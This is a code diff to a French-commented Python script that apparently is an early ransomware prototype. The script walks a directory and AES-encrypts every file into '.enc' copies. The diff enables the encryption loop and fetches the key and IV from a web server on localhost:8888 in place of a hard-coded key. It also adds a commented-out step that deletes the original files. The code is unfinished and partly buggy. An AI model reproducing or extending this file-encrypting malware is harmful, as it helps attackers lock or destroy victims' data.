@@ -3,11 +3,23 @@ from Crypto import Random
 import os
 import random
 import struct
+import requests
 
+#faire une requête get au serveur web pour récupérer la clé et l'iv
+url = 'http://localhost:8888/key.txt'
+resp = requests.get(url)
+key=resp.text
+
+url = 'http://localhost:8888/iv.txt'
+resp = requests.get(url)
+iv=resp.text
+
+#pour voir si la key est bien dans la variable, A SUPPRIMER#
+print(key)
+print(iv)
 
 # a changer en /tmp
 baseUrl = './copie'
-key = b"3CC5DBACEFB9D865"
 
 
 def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
@@ -16,7 +28,7 @@ def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
         out_filename = filename + '.enc'
 
     # iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
-    iv = Random.new().read(AES.block_size)
+    #iv = Random.new().read(AES.block_size)
 
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     filesize = os.path.getsize(filename)
@@ -34,6 +46,8 @@ def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
                     chunk += b' ' * (16 - len(chunk)%16)
 
                 outfile.write(encryptor.encrypt(chunk))
+    
+    
 
 
 def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
@@ -62,11 +76,11 @@ for root, dirs, files in os.walk(baseUrl, topdown=False):
         file = os.path.join(root, name)
         print(file)
         # encrypt
-        '''
         if file[-4:] != ".enc":
             print("[*] Encrypting... ")
             encryptFile(key, file)
-        '''
+            #pour supprimer le fichier d'origine
+            #os.remove(file)
 
         # decrypt
         if file[-4:] == ".enc":
